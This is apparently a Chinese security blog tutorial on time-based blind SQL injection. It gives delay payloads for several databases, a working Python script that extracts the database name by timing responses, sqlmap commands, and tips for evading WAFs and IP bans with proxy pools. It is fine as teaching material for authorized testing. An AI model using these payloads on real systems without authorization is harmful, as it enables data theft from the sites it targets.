---
title: SQL 注入：时间盲注详解
date: 2024-10-01 08:00:00
tags:
  - Web安全
  - 渗透测试
categories: 渗透测试
description: 页面完全无差异时，时间盲注是最后的武器——用 sleep 延迟逐位猜解数据，SQLMap --technique=T 全自动化，以及手工构造时间延迟 payload。
---

## 什么时候用时间盲注

布尔盲注需要页面 TRUE/FALSE 差异。但如果页面**完全无差异**（不管查得到查不到都返回一样的内容），就只能用时间盲注。

原理：TRUE 条件时执行 `sleep(5)` 延迟 5 秒，FALSE 条件不延迟。通过响应时间差异逐位猜解数据。

---

## 各数据库的延迟函数

| 数据库 | 延迟函数 |
|--------|---------|
| MySQL | `sleep(N)` / `benchmark(50000000,md5(1))` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| PostgreSQL | `pg_sleep(N)` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` / `dbms_lock.sleep(5)` |

---

## MySQL 时间盲注 Payload

```sql
-- 判断注入点
?id=1 AND sleep(5) -- -                    → 延迟 5 秒 = 有注入

-- 猜库名长度
?id=1 AND IF(length(database())=5,sleep(3),0) -- -

-- 猜库名每个字符
?id=1 AND IF(ascii(substr(database(),1,1))=115,sleep(3),0) -- -
```

完整的 IF 条件延迟：

```sql
AND IF(条件, sleep(3), 0)
```

条件为真 → sleep(3) → 延迟 3 秒；条件为假 → 0 → 不延迟。

---

## Python 自动化时间盲注

```python
import requests
import time

url = "http://target.com/page.php?id=1"
timeout = 3

# 猜库名长度
db_len = 0
for l in range(1, 30):
    payload = f" AND IF(length(database())={l},sleep({timeout}),0)"
    start = time.time()
    r = requests.get(url + payload, timeout=timeout + 5)
    elapsed = time.time() - start
    if elapsed > timeout:
        db_len = l
        print(f"[+] 库名长度: {db_len}")
        break

# 二分法猜库名
db_name = ""
for pos in range(1, db_len + 1):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f" AND IF(ascii(substr(database(),{pos},1))>{mid},sleep({timeout}),0)"
        start = time.time()
        r = requests.get(url + payload, timeout=timeout + 5)
        elapsed = time.time() - start
        if elapsed > timeout:
            low = mid + 1
        else:
            high = mid
    db_name += chr(low)
    print(f"[+] {db_name}")

print(f"[+] 库名: {db_name}")
```

注意 `timeout` 设太大浪费时间，设太小容易被网络波动误判。推荐 `timeout=3`。

---

## MSSQL 时间盲注

```sql
-- 条件延迟
IF(条件) WAITFOR DELAY '0:0:5'

-- 实例：判断当前用户是否为 dbo
?id=1; IF (SELECT user)='dbo' WAITFOR DELAY '0:0:5' -- -
```

堆叠查询 `;` 配合 `IF...WAITFOR DELAY`。MSSQL 没有 MySQL 的 `IF()` 三元函数，用 TSQL 的 `IF (...) WAITFOR DELAY` 语句。

---

## PostgreSQL 时间盲注

```sql
-- 条件延迟
?id=1; SELECT CASE WHEN (条件) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- 完整例子
?id=1; SELECT CASE WHEN (SELECT length(current_database()))=5 THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

---

## SQLMap 时间盲注参数

```bash
# 指定只做时间盲注
sqlmap -u "http://target.com/page.php?id=1" --technique=T --dbs --batch

# 自定义延迟秒数
sqlmap -u "..." --technique=T --time-sec=3 --dbs

# 多线程加速（时间盲注专用）
sqlmap -u "..." --technique=T --threads=3 --time-sec=2
```

---

## 实战踩坑

1. **网络波动误判** → 每个请求多次测取平均值，设阈值而非精确匹配
2. **sleep 被 WAF 拦** → 换 `benchmark(50000000,md5(1))`（CPU 密集型延迟）；或 PostgreSQL 换 `SELECT count(*) FROM generate_series(1,50000000)`
3. **sleep 太慢** → 猜 20 位的 hash 要上百次 × 3 秒 = 几分钟。试降到 1~2 秒
4. **SQLMap 线程太多** → 时间盲注用 `--threads=3` 够多了，10 线程会把延迟混淆
5. **目标服务器有限流** → 单 IP 频繁请求被 ban，换代理池

---

## 防御

参数化查询。时间盲注是最后一道防线的武器——如果到了这一步攻击者还能拿数据，说明 SQL 注入防护从根本上是缺失的。

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
